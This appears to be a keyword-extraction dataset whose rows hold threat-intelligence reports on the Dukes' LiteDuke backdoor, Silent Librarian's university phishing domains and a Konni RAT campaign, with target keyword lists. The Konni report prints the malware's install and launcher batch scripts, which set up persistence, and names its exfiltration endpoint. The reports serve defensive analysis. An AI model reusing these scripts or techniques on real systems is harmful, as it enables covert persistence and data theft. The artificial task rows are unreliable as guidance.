conditions that are always True or always False. They are not part of the code's semantic, but the code is harder to read. Figure 35 is an example of opaque predicates we found in FatDuke. Whatever the result of rand() is, v11 is always equal to 15. Thus, the condition is always False.Figure 35 // FatDuke obfuscation – Opaque predicate30Third, they add junk code and junk strings. Unlike opaque predicates, the code will be executed but it is useless and again is not part of the semantics of the program. For example, the function in Figure 36 and in Figure 37 returns always the same value, which is never used.Figure 36 // FatDuke obfuscation – Junk function callFigure 37 // FatDuke obfuscation – Junk function return valueThe binary contains a huge amount of strings from different projects like Chromium. It might be an attempt to bypass security products, similar to what was posted by SkyLight [27]. These strings are used to fill very large structures (about 1000 fields), probably to hide the few interesting fields used by the malware, as shown in Figure 38.Figure 38 // FatDuke obfuscation – Chromium stringsWe are not sure whether Dukes’ developers used a commercial obfuscation tool or if they developed their own. However, given their level of sophistication, it would not be surprising if they rely on their own obfuscator.314.6 LiteDuke: the former third stage LiteDuke is a third-stage backdoor that was mainly used in 2014-2015. It is not directly linked to Operation Ghost, but we found it on some machines compromised by MiniDuke. We chose to document it mainly because we did not find it described elsewhere. We have dubbed it LiteDuke because it uses SQLite to store information such as its configuration. Our analysis is based on the sample with SHA-1 AF2B46D4371CE632E2669FEA1959EE8AF4EC39CE.Link with the Dukes LiteDuke uses the same dropper as PolyglotDuke. It also uses the same encryption scheme, shown in Figure 7 in section 3 2, to obfuscate its strings. As we haven’t seen any other threat actor using the same code, we are confident that LiteDuke was indeed part of the Dukes’ arsenal.Packer LiteDuke is packed using several layers of encryption and steganography.1. In the PE resources section, the initial dropper has a GIF picture. The picture is not valid but containsa second dropper.2. This second executable has a BMP picture in its resources. It uses steganography to hide bytesin the image. Once decoded and decrypted, we have the loader.3. The loader will decrypt the backdoor code and load it into memory.Figure 39 summarizes the unpacking process from the initial dropper to the backdoor code.exeDropper (cid:7)exeDropper (cid:141)exeLoaderExtract from the resourcessectionDecryptand executeExtract from the resourcessectionDecode, decrypt, drop and executeDecrypt and loadinto memoryGIFGIF picture(cid:20)invalid(cid:14)BMPBMP picture(cid:31)with data hiddenusing steganography(cid:14)BackdoorFigure 39 // LiteDuke unpacking processSide StoryWe also noticed that the attackers left a curious artefact in an older sample (the dropper with SHA-1 7994714FFDD6411A6D64A7A6371DB9C529E70C37) as shown in Figure 40.Figure 40 // Curious phone number left by the attackersThis is the phone number of a mental health specialist in a small city in the state of Indiana in the United States.32Backdoor The backdoor code only exists in memory as only the loader is written to disk. The loader persists using a Windows shortcut (.lnk file) that is registered in the traditional CurrentVersion\Run registry key. According to the PE header, the developers did not make use of Visual Studio to compile this backdoor. Figure 41 shows that they used the linker FASM 1.70. FASM (Flat Assembler) is an assembler that can produce Windows or Linux binaries. It reminds us of the MiniDuke backdoor, developed directly in x86 assembly.Figure 41 // Assembler used by the developer (screenshot of DIE analysis)The backdoor DLL exports seven functions that have relatively explicit names (CC being Crypto Container):• SendBin • DllEntryPointInterestingly, the malware apparently attempts to bypass Kaspersky security products by checking if the registry key HKCU\Software\KasperskyLab exists and if so, it waits 30 seconds before executing any additional code. We do not know whether this really bypasses any Kaspersky security products.The Crypto Container is an SQLite database, stored on the disk in the same directory as the loader, and uses SQLCipher. This SQLite extension encrypts the database using AES-256. The encryption key is the MD5 hash of machine-specific values (such as CPUID, the account name, the BIOS version and the processor name) to prevent decryption if, for example, the database ends up in a public malware repository. The key is not stored anywhere but is re-generated at each execution.The database contains three different tables, which are created using the following commands:CREATE	TABLE	modules	(uid	INTEGER	PRIMARY	KEY,	version	char(255), code	blob,	config	blob,	type	char(10),	md5sum	char(32),	autorun (INTEGER); CREATE	TABLE	objects	(uid	INTEGER	PRIMARY	KEY	AUTOINCREMENT,	name CHAR(255),	body	blob,	type	char(10),	md5sum	char(32)); CREATE	TABLE	config	(uid	INTEGER	PRIMARY	KEY	AUTOINCREMENT,	agent_id CHAR(128),	remote_host	CHAR(256),	remote_port	integer,	remote_path char(1024),	update_interval	integer,	server_key	CHAR(32),	rcv_header CHAR(64));The configuration default values are hardcoded in the binary. This SQLite table allows the malware operators to update these parameters easily.Similarly, the modules, which are plug-ins for the backdoor, are stored in the database. Since the database is encrypted, the modules never touch the disk in plaintext and will only be loaded into memory. Unfortunately, we have not yet been able to find any of the plug-ins used by LiteDuke.One artefact of the development method is the implementation of the backdoor commands. Usually, a backdoor will have a big switch statement to check the command sent by the C&C server against the list of commands implemented in the malware. In the case of LiteDuke, it is a succession of loops: one loop per implemented command, as shown in Figure 42.33Figure 42 // Multiple while loops instead of a backdoor switch caseEach of the 41 different commands has between three and six possible command IDs. The program will loop successively on the list until the ID in the list matches the ID provided by the operator. The full list is available in Figure 43.Figure 43 // List of LiteDuke command IDsGiven the large number of different commands, we won’t list them all. Basically, the backdoor can:• Upload or download files • Securely delete a file by first writing random data (from a linear congruential generator) to the file • Update the database (config, modules and objects) • Create a process • Get system information (CPUID, BIOS version, account name, etc.) • Terminate itselfThe network part of the backdoor is relatively simple. It uses GET requests to contact either the hardcoded C&C URL or the one stored in the database. Figure 44 shows the domain, resources and parameters used by LiteDuke.34Figure 44 // LiteDuke C&C domain, resources and parametersAmong the different samples we analyzed, the C&C domains are different, but they always use a script named rcv_get.php. We believe that the C&C domains are compromised servers. In order to blend into the network traffic, and similar to FatDuke, the malware checks the default browser and chooses its User-Agent request header accordingly, as shown in Table 7. It can also get the proxy configuration from Firefox, in the configuration file prej.js, or from Opera, in the operaprefs.ini file. This information is then used when establishing a connection to the C&C server.Table 7User-Agent strings used by LiteDukeDefault BrowserInternet ExplorerFirefoxChromeSafariOperaUser-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729) Mozilla/5.0 (Windows NT 6.2; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWeb- Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4 Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.7.62 Version/11.01As one can see, some of these User-Agents are custom and they all refer to very old browsers, most of them released in 2011. It is also way less stealthy than with FatDuke’s sniffing of the real User-Agent used by the local browser. This reinforces our hypothesis that this backdoor was used many years ago and is no longer deployed in the wild.5. CONCLUSION Operation Ghost shows that the Dukes never stopped their espionage activities. They were in the spotlight after the breach of the Democratic National Committee during the 2016 US presidential elections. However, they then recovered from that media attention and rebuilt most of their toolset.Using these new tools and previously used techniques, such as leveraging Twitter and steganography, they were able to breach Foreign Affairs Ministries of several European governments.This campaign also shows that APT threat actors going dark for several years does not mean they have stopped spying. They might pause for a while and re-appear in another form, but they still need to spy to fulfill their mandates.To help defenders better protect their networks, we will continue to monitor the Dukes’ developments.Indicators of Compromise can also be found on GitHub. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset com.356. BIBLIOGRAPHY 1 D. Alperovitch, “Bears in the Midst: Intrusion into the Democratic National Committee,” 15 06 2016. [Online].Available: url crowdstrike com/blog/bears-midst-intrusion-democratic-national-committee/.2 Department of Homeland Security, “Enhanced Analysis of GRIZZLY STEPPE Activity,” 10 02 2017. [Online]. Available: url us-cert gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_ STEPPE_Activity pdf.3 GReAT, “The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor,”27 02 2013. [Online]. Available: url com/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/31112/.4 A. Lehtiö, “THE DUKES: 7 years of Russian cyberespionage,” 17 09 2015. [Online].Available: url f-secure com/documents/996508/1030745/dukes_whitepaper pdf.5S. R. Skjeggestad, H. Stolt-Nielsen, L. Tomter, E. Omland and A. Strønen, “Norge utsatt for et omfattende hackerangrep,” 07 02 2017. [Online]. Available: url nrk no/norge/norge-utsatt-for-et-omfattende-hackerangrep-1 13358988.6 A. T. Matthew Dunwoody, B. Withnell, J. Leathery, M. Matonis and N. Carr, “Not So Cozy: An UncomfortableExamination of a Suspected APT29 Phishing Campaign,” 19 11 2018. [Online]. Available: url fireeye com/ blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign html.7 A. Cherepanov, “GREYENERGY: A successor to BlackEnergy,” 10 2018. [Online]. Available:url welivesecurity com/wp-content/uploads/2018/10/ESET_GreyEnergy pdf.8 A. Cherepanov, “The rise of TeleBots: Analyzing disruptive KillDisk attacks,” ESET, 13 12 2016. [Online].Available: url welivesecurity com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/.9 T. Brewster, “Sophisticated ‘MiniDuke’ hackers start hunting governments and drugdealers,” 03 07 2014. [Online]. Available: url theguardian com/technology/2014/jul/03/ miniduke-hackers-governments-drug-dealers-kaspersky.10 F-Secure, “COZYDUKE,” 22 04 2015. [Online]. Available:url f-secure com/documents/996508/1030745/CozyDuke.11 M. Dunwoody, “Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY),”03 04 2017. [Online]. Available: url fireeye com/blog/threat-research/2017/03/dissecting_one_ofap html.12 FireEye, “HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group,” 07 2015. [Online].Available: url fireeye com/rs/848-DID-242/images/rpt-apt29-hammertoss pdf.131415Symantec Security Response, “’Forkmeiamfamous’: Seaduke, latest weapon in the Duke armory,” 13 07 2015. [Online]. Available: url symantec com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory.S. Adair, “PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs,” 09 11 2016. [Online]. Available: url volexity com/blog/2016/11/09/ powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/.J. Pitts, “The Case of the Modified Binaries,” 23 10 2014. [Online]. Available: url leviathansecurity com/blog/the-case-of-the-modified-binaries/.16 A. Lehtiö, “OnionDuke: APT Attacks Via the Tor Network,” 14 11 2014. [Online]. Available:url f-secure com/weblog/archives/00002764 html.17 ESET Research, “Miniduke still duking it out,” 20 05 2014. [Online]. Available:url welivesecurity com/2014/05/20/miniduke-still-duking/.1819S. Lozhkin, “Minidionis – one more APT with a usage of cloud drives,” 15 07 2015. [Online]. Available: url com/minidionis-one-more-apt-with-a-usage-of-cloud-drives/71443/.J.-I. Boutin and M. Faou, “Visiting the snake nest,” 01 2018. [Online]. Available: url cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest pdf.3620 ESET Research, “En Route with Sednit,” 10 2016. [Online]. Available:url welivesecurity com/wp-content/uploads/2016/10/eset-sednit-full pdf.21 GReAT, “Miniduke is back: Nemesis Gemina and the Botgen Studio,” 03 07 2014. [Online]. Available:url com/miniduke-is-back-nemesis-gemina-and-the-botgen-studio/64107/.22 The Unicode Consortium, “Katakana Range: 30A0–30FF,” [Online]. Available:url unicode org/charts/PDF/U30A0 pdf.23 The Unicode Consortium, “Cherokee Range: 13A0-13FF,” [Online]. Available:url org/charts/PDF/U13A0 pdf.24 The Unicode Consortium, “Kangxi Radicals Range: 2F00-2FDF,” [Online]. Available:url org/charts/PDF/U2F00 pdf.25 P.-M. Bureau and C. Dietrich, “Hiding in Plain Sight,” 2015. [Online]. Available: url blackhat com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels pdf.26 T. László and Á. Kiss, “Obfuscating C++ programs via control flow flattening,” 08 2009. [Online].Available: url inf elte hu/Vol_030_2009/003 pdf.27Skylight, “Cylance, I Kill You!,” 18 07 2019. [Online]. Available: url com/2019/07/18/cylance-i-kill-you/.Compilation Date 07/07/2014 07/06/2017 07/06/2017 07/08/2017 19/10/2018 21/12/2017 10/07/2018 29/08/2018 01/10/2018 25/10/2018 01/12/2018 29/08/2018 17/08/2018 24/06/2019 03/05/2017 22/05/2019 19/04/2019 02/10/2014ESET detection name Win32/Agent.ZWH Win32/Agent.AAPY Win32/Agent.ZWH Win64/Agent.OL Win64/Agent.OL MSIL/Tiny.BG MSIL/Tiny.BG MSIL/Agent.TGC MSIL/Agent.SVP MSIL/Agent.SXO MSIL/Agent.SYC MSIL/Agent.CAW Win32/Agent.TSG Win32/Agent.TUF Win32/Agent.TSH Win32/Agent.TSH Win32/Agent.AAPY Win32/Agent.AART377.INDICATORS OF COMPROMISE7.1 HashesComponentSHA-14BA559C403FF3F5CC2571AE0961EAFF6CF0A50F6 AF2B46D4371CE632E2669FEA1959EE8AF4EC39CEPolyglotDukeRegDuke LoaderRegDuke BackdoorMiniDukeFatDukeFatDuke Loader LiteDuke7.2 NetworkDomainsComponentDomainacciaio.com[.]br mavin21c.dothome.co[.]kr rulourialuminiu.co[.]uk bandabonga[.]frPolyglotDukeMiniDukeFatDukeLiteDuke38Public webpages used by PolyglotDukeurl url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url url#q=Heiofjskghwe+Hjwefkbqw url url url url MITRE ATT&CK TECHNIQUES MovementT1078Valid AccountsT1106Execution through APIT1129T1086 Registry Run Keys / Startup Folder Scheduled TaskValid AccountsWindows Management Files or Information File DeletionModify RegistryObfuscated Files or InformationRundll32 ScriptingT1045Software PackingT1078Valid AccountsT1102Web ServiceT1083T1135 T1057T1049File and Directory Discovery Network Share Discovery The Dukes likely used spearphishing emails to compromise the target. Operators use account credentials previously stolen to come back on the victim’s network. They use CreateProcess or LoadLibrary Windows APIs to execute binaries.Some of their malware load DLL using LoadLibrary Windows API.FatDuke can execute PowerShell scripts. The FatDuke loader uses rundll32 to execute the main DLL. FatDuke can execute PowerShell scripts. The Dukes use PsExec to execute binaries on remote hosts. The Dukes use the CurrentVersion\Run registry key to establish persistence on compromised computers. The Dukes use Scheduled Task to launch malware at startup. The Dukes use account credentials previously stolen to come back on the victim’s network.The Dukes used WMI to establish persistence for RegDuke.The droppers for PolyglotDuke and LiteDuke embed encrypted payloads. The Dukes malware can delete files and directories. The keys used to decrypt RegDuke payloads are stored in the Windows registry. The Dukes encrypts PolyglotDuke and LiteDuke payloads with custom algorithms. They also rely on known obfuscation techniques such as opaque predicates and control flow flattening to obfuscate RegDuke, MiniDuke and FatDuke. The FatDuke loader uses rundll32 to execute the main DLL. FatDuke can execute PowerShell scripts. The Dukes use a custom packer to obfuscate MiniDuke and FatDuke binaries. They also use the commercial packer .NET Reactor to obfuscate RegDuke. The Dukes use account credentials previously stolen to come back on the victim’s network. PolyglotDuke fetches public webpages (Twitter, Reddit, Imgur, etc.) to get encrypted strings leading to new C&C. server. For RegDuke, they also use Dropbox as a C&C server. The Dukes can interact with files and directories on the victim’s computer. The Dukes can list network shares. The Dukes can list running processes. The Dukes can execute commands like net use to gather information on network connections.T1077Windows Admin SharesThe Dukes use PsExec to execute binaries on a remote host.40CollectionCommand and ControlT1005T1039T1025Data from Local System Data from Network Shared Drive Data from Removable MediaT1090Connection ProxyT1001Data ObfuscationT1008Fallback ChannelsT1071Standard Application Layer ProtocolT1102Web ServiceExfiltrationT1041Exfiltration Over Command and Control ChannelThe Dukes can collect files on the compromised machinesThe Dukes can collect files on shared drives.The Dukes can collect files on removable drives.The Dukes can communicate to the C&C server via proxy. They also use named pipes as proxies when a machine is isolated within a network and does not have direct access to the internet. The Dukes use steganography to hide payloads and commands inside valid images. The Dukes have multiple C&C servers in case one of them is down. The Dukes are using HTTP and HTTPS protocols to communicate with the C&C server. PolyglotDuke fetches public webpages (Twitter, Reddit, Imgur, etc.) to get encrypted strings leading to new C&C server. For RegDuke, they also use Dropbox as a C&C server.The Dukes use the C&C channel to exfiltrate stolen data. ","{'phrases': ['spearphishing emails', 'attachments', 'targets', 'drop', 'PolyglotDuke', 'RegDuke', 'first stage', 'system info', 'Command', 'servers', 'Twitter', 'Reddit', 'Miniduke', 'Second', 'Backdoor', 'FatDuke', 'documents', 'data', 'HTTPS'], 'target': 'spearphishing emails; attachments; targets; drop; PolyglotDuke; RegDuke; first stage; system info; Command; servers; Twitter; Reddit; Miniduke; Second; Backdoor; FatDuke; documents; data; HTTPS.'}"
spear; phishing; links; targets; the target; the URL; the link;.me;.tk; the target; the malware; the backdoor;.dll; the infected system; the system; tools;.abt; the attacker; the library; sensitive files; the data; the victim; the compromised system; time.,"['1. The threat actor registers doppelgänger domains mimicking real university websites. 2. They set up phishing pages on these domains and host them on servers in Iran. 3. The group sends spear phishing emails to university staff and students containing links to the fake sites. 4. Targets who click the links are taken to the phishing pages designed to steal their credentials. 5. Users are prompted to enter their usernames and passwords on the fake login pages. 6. The entered credentials are captured by the threat actor and compromised. 7. The group uses the stolen credentials to gain access to university accounts and further infiltrate networks. 8. They exfiltrate sensitive research data and intellectual property from compromised accounts and systems. 9. The phishing sites are quickly taken down, but the attacker rapidly registers new domains and continues attacks. 10. The cycle repeats annually coinciding with the university school year starting in September. ']","Extract the keywords: 11/16/2020Silent Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes LabsSilent Librarian APT right on schedule for 20/21 academic yearblog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attackThreat Intelligence TeamOctober 14, 2020A threat actor known as Silent Librarian/TA407/COBALT DICKENS has been actively targeting universities via spear phishing campaigns since schools and universities went back.In mid-September, we were tipped off by one of our customers about a new active campaign from this APT group. Based off a number of intended victims, we can tell that Silent Librarian does not limit itself to specific countries but tries to get wider coverage.Even though many phishing sites have been identified and taken down, the threat actor has built enough of them to continue with a successful campaign against staff and students alike.A persistent threat actor with a perfect attendance recordIn March 2018, nine Iranians were indicted by the US Department of Justice for conducting attacks against universities and other organizations with the goal of stealing research and proprietary data.Yet, both in August 2018 and 2019 Silent Librarian was lining up for the new academic years, once again targeting the same kind of victims in over a dozen countries.IT administrators working at universities have a particularly tough job considering that their customers, namely students and teachers, are among the most difficult to protect due to their behaviors. Despite that, they also contribute to and access research that could be worthurl Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes Labsmillions or billions of dollars.Considering that Iran is dealing with constant sanctions, it strives to keep up with world developments in various fields, including that of technology. As such, these attacks represent a national interest and are well funded.Same pattern in phishing domain registrationThe new domain names follow the same pattern as previously reported, except that they swap the top level domain name for another. We know that the threat actor has used the “.me” TLD in their past campaigns against some academic intuitions and this is still the case, along side “.tk” and “.cf”.This new phishing campaign has been tracked by several security researchers on Twitter, notably Peter Kruse from the CSIS Security Group.url Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes LabsPhishing siteLegitimate siteTargetlibrary.adelaide.crev.mesignon.adelaide.e- du.au.itlib.meblackboard.g- cal.crev.meblackboard.stony- brook.ernn.meblackboard.stony- brook.nrni.melibrary.adelaide.e- du.aulibrary.adelaide.e- du.aublackboard.g- cal.ac.ukblackboard.stony- brook.edublackboard.stony- brook.eduThe University of Adelaide LibraryThe University of Adelaide LibraryGlasgow Caledonian UniversityStony Brook UniversityStony Brook Universitynamidp.services.uu.n- l.itlib.menamidp.services.u- u.nlUniversiteit Utrechtuu.blackboard.rres.meuu.blackboard.comUniversiteit Utrechtlibrarysso.vu.cvrr.melibrarysso.vu.edu.au Victoria Universityole.bris.crir.meole.bris.ac.ukUniversity of Bristolidpz.utorauth.utoronto.- ca.itlf.cfidpz.utorauth.u- toronto.caUniversity of Torontoraven.cam.ac.uk.iftl.tkraven.cam.ac.ukUniversity of Cambridgelogin.ki.se.iftl.tklogin.ki.seKarolinska Medical Institutetshib.york.ac.uk.iftl.tkshib.york.ac.ukUniversity of Yorksso.id.kent.ac.uk.iftl.tksso.id.kent.ac.ukUniversity of Kentidp3.it.gu.se.itlf.cfidp3.it.gu.seGöteborg universitetlogin.proxy1.lib.uwo.- ca.sftt.cflogin.proxy1.lib.u- wo.caWestern University Canadalogin.libproxy.k- cl.ac.uk.itlt.tkidcheck2.qmul.ac.uk.s- ftt.cfkcl.ac.ukKing’s College Londonqmul.ac.ukQueen Mary University of Londonlms.latrobe.aroe.melms.latrobe.edu.auMelbourne Victoria Australiantulearn.ntu.ninu.mentulearn.ntu.edu.sgNanyang Technological Universityurl Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes Labsadfs.lincol- n.ac.uk.itlib.meadfs.lincoln.ac.ukUniversity of Lincolncas.thm.de.itlib.mecas.thm.deTH Mittelhessen University of Ap- plied Scienceslibproxy.library.unt.e- du.itlib.meshibboleth.mcgill.- ca.iftl.tklibrary.unt.eduUniversity of North Texasshibboleth.mcgill.ca McGill Universityvle.cam.ac.uk.canm.mevle.cam.ac.ukUniversity of CambridgeTable 1: List of phishing sites and targetsRegistering these subdomains to perform phishing attacks against universities is a known behavior for this APT group and therefore we can expect that they were registered by the same actor.Figure 1: Phishing site for the University of AdelaidePhishing sites hosted in IranThe threat actor uses Cloudflare for most of their phishing hostnames in order to hide the real hosting origin. However, with some external help we were able to identify some of their infrastructure located on Iran-based hosts.url Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes LabsIt may seem odd for an attacker to use infrastructure in their own country, possibly pointing a finger at them. However, here it simply becomes another bulletproof hosting option based on the lack of cooperation between US or European law enforcement and local police in Iran.Figure 2: Part of the phishing infrastructure showing connections with IranClearly we only uncovered a small portion of this phishing operation. Although for the most part the sites are taken down quickly, the attacker has the advantage of being one step ahead and is going for many possible targets at once.We are continuing to monitor this campaign and are keeping our customers safe by blocking the phishing sites.Indicators of Compromise (IOCs)library[.]adelaide[.]crev[.]me signon[.]adelaide[.]edu[.]au[.]itlib[.]me blackboard[.]gcal[.]crev[.]me blackboard[.]stonybrook[.]ernn[.]me blackboard[.]stonybrook[.]nrni[.]me namidp[.]services[.]uu[.]nl[.]itlib[.]me uu[.]blackboard[.]rres[.]me librarysso[.]vu[.]cvrr[.]me ole[.]bris[.]crir[.]me idpz[.]utorauth[.]utoronto[.]ca[.]itlf[.]cf raven[.]cam[.]ac[.]uk[.]iftl[.]tkurl Librarian APT right on schedule for 20/21 academic year - Malwarebytes Labs | Malwarebytes Labslogin[.]ki[.]se[.]iftl[.]tk shib[.]york[.]ac[.]uk[.]iftl[.]tk sso[.]id[.]kent[.]ac[.]uk[.]iftl[.]tk idp3[.]it[.]gu[.]se[.]itlf[.]cf login[.]proxy1[.]lib[.]uwo[.]ca[.]sftt[.]cf login[.]libproxy[.]kcl[.]ac[.]uk[.]itlt[.]tk idcheck2[.]qmul[.]ac[.]uk[.]sftt[.]cf lms[.]latrobe[.]aroe[.]me ntulearn[.]ntu[.]ninu[.]me adfs[.]lincoln[.]ac[.]uk[.]itlib[.]me cas[.]thm[.]de[.]itlib[.]me libproxy[.]library[.]unt[.]edu[.]itlib[.]me shibboleth[.]mcgill[.]ca[.]iftl[.]tk vle[.]cam[.]ac[.]uk[.]canm[.]me158[.]58[.]184[.]213 46[.]209[.]20[.]154 103[.]127[.]31[.]155url ","{'phrases': ['the threat actor', 'Iran', 'spear', 'staff', 'students', 'Targets', 'APT', 'Compromise', 'access', 'research', 'The phishing sites', 'the attacker', 'attacks', '10', 'September'], 'target': 'the threat actor; Iran; spear; staff; students; Targets; APT; Compromise; access; research; The phishing sites; the attacker; attacks; 10; September.'}"
The attacker; PE; a spear phishing email; a Russian; RAT; The final payload; an HTTP GET request; the Command-and-Control domain; 401; the attack; the CAB file; the installer.bat; the system; the DLL; the shellcode; the shellcode; the C2 server; additional payloads; the attack; the attacker.,"['1. The attack starts with a phishing email containing a malicious .zip file as an attachment. The zip file contains an executable dropper. 2. When the victim opens and executes the dropper, it displays a Russian holiday-themed image as a decoy. In the background, it contacts a command and control server to download the next stage payload, which is a CAB file. 3. The dropper extracts the CAB file, which contains a batch script, Konni RAT executable, and configuration file. 4. The batch script waits for the CAB to decompress then executes the Konni RAT installer. 5. The installer moves the RAT files into System32 and registers the RAT as a Windows service to load at startup. 6. The Konni RAT gathers system info, browsing history, processes, and user details, archives the data, and encrypts it. 7. The RAT exfiltrates the encrypted data to the command and control server. It can also receive additional commands from the C2. ']","Extract the keywords: TLP:WHITE01 // 03 // 2022 NORTH KOREAN GROUP “KONNI” TARGETS THE RUSSIAN DIPLOMATIC SECTOR WITH NEW VERSIONS OF MALWARE IMPLANTSwww.cluster25.io @cluster25_ioTABLE OF CONTENTSKILLCHAIN OVERVIEW KONNI RAT ANALYSIS ATTRIBUTION ATT&CK MATRIX INDICATORS OF COMPROMISE 192022 // © Cluster25EXECUTIVE SUMMARYCluster25 analyzed a recent attack linked to the North Korean APT group “Konni” targetingRussian diplomatic sector using a spear phishing theme for New Year's Eve festivities as lure. Oncethe malicious email attachment is opened and executed, a chain composed by multiple stages istriggered, allowing actor to install an implant belonging to the Konni RAT family as finalpayload.2022 // © Cluster25TLP:WHITEUnrestricted // freely shareable content01 KILLCHAIN OVERVIEW scrnsave.scr Windows application. When executed, it drops under the %TEMP% directory animage named Happy.jpg (which is embedded in the resource section) and opens it as aforeground window to trick the victim into believing that it is a legitimate Russian themed happyholidays screensaver.Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domaini758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756and a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-and-Control Apache webserver response was configured to respond with HTTP status code 401,having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks),returning as a response, in any case, a compressed CAB file encoded in base64 visible in theevidence below.2022 // © Cluster256TLP:WHITEUnrestricted // freely shareable contentAfter the CAB downloading, the malware starts the file decompression using expand.exe processlogging a file named - a.log - when the decompression is finished. The following image illustratesthe snipped of code described.2022 // © Cluster257TLP:WHITEUnrestricted // freely shareable contentTo optimize the time wasted during CAB decompression, the malware writes and executes the following BAT file into the %TEMP% directory, which was contained in the data section encodedin base64:CODE@ECHO OFFCD /D %TEMP%: WAITINGTIMEOUT /T 1IF NOT EXIST ""A.LOG"" (GOTO WAITING)DEL /F /Q ""A.LOG""INSTALL.BAT DEL /F /Q ""%~DPNX0”The script’s scope is to wait for the decompression to finish by using the creation of a.log file asflag and automatically execute the content of the CAB extraction, which is the install.bat file (oneof the files contained into the CAB), and finally delete itself using ""%~DPNX0”, a bat scriptconvention used to specify the BAT fileitself. As previously described the CAB file’sdecompressed content contains the following files: Install.bat scrnsvc.ini scrnsvc.dllInstall.bat file is the launcher of the next stage infection, which hides the tracks of the previous activities by moving all the files into the System32 directory and installing and starting the final2022 // © Cluster258TLP:WHITEUnrestricted // freely shareable contentimplant scrnsvc.dll as a Windows service named ScreenSaver Management Service, which, when registered, loads the configuration file scrnvsvc.ini. The Windows service is installed byconfiguring svchost.exe as a process container of the DLL executable representing Konni RATmalware. Install.bat has already been seen among the TTPs belonging to this threat actor, whichcontent is visible below, where, in this case, it appears to have been slightly modified, and thereforemore likely to deceive detection signatures referring to files used in previous intrusions.CODE@echo offset DSP_NAME=""ScreenSaver Management Service""sc stop scrnsvc > nulecho %~dp0 | findstr /i ""system32"" > nulif %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE): COPYFILEcopy /y ""%~dp0\scrnsvc.dll"" ""%windir%\System32"" > nuldel /f /q ""%~dp0\scrnsvc.dll"" > nulcopy /y ""%~dp0\scrnsvc.ini"" ""%windir%\System32"" > nuldel /f /q ""%~dp0\scrnsvc.ini"" > nuldel /f /q ""%windir%\System32\scrnsvc.dat"" > nul: INSTALLsc create scrnsvc binpath= ""%windir%\System32\svchost.exe -k scrnsvc"" DisplayName= %DSP_NAME% > nulsc description scrnsvc %DSP_NAME% > nulsc config scrnsvc type= interact type= own start= auto error= normal binpath= ""%windir%\System32\svchost.exe -k scrnsvc"" > nulreg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v scrnsvc /t REG_MULTI_SZ /d ""scrnsvc"" /f > nul2022 // © Cluster259TLP:WHITEUnrestricted // freely shareable contentCODEreg add ""HKLM\SYSTEM\CurrentControlSet\Services\scrnsvc\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%windir%\System32\scrnsvc.dll"" /f > nulsc start scrnsvc > nuldel /f /q ""%~dp0\wpnprv.dll"" > nuldel /f /q ""%~dp0\*.bat"" > nul be converted into a CAB file using cmd /c makecab and furtherly encrypted and sent to theattackerserverviaHTTPPOSTrequestbodytohxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME%, passingthe operatingsystem computer name as parameter as evidences in the network dump reported following:If the server response does not contain the string “success!” the malware tries to resend therequest, or it starts to send HTTP GET loop requests to receive commands from the server locatedat hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt. The commandsreceived are parsed from the response and, if containing the character ”>” are executed viaCreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoidexceptions during output redirection of the file writing, being the sample located in System32folder), otherwise using the CreateProcessW function.2022 // © Cluster2512TLP:WHITEUnrestricted // freely shareable contentAt the time of the analysis the server was up but it did not provide the commands to be executed,probably because the actor set up the Command and Control backend with some form ofgeofencing validation.05 ATTRIBUTIONCluster25 attributes these intrusion attempts with high degree of confidence to the North Koreangroup known as Konni. Konni is also the name of their custom RAT which presents intelligencegathering features. In this case the final implant is a new version of Konni RAT having code andbehavioral similarities with its previous versions. The reported kill-chain shows overlaps with theTTPs already linked to this group as the use of CAB files as infection stage and the use of bat fileto automatically install Konni RAT as a service. Identifiable modifications are evident in the patternused for the initial access phase, most likely put in place to exploit the holiday time of year as bait.2022 // © Cluster2513TLP:WHITEUnrestricted // freely shareable contentFinally, it is possible to notice the use of ""ZETTA HOSTING SOLUTIONS LLC"" (AS44476) as Cluster25 is the internal Cyber Intelligence Research and Adversary Hunting Unit at DuskRise 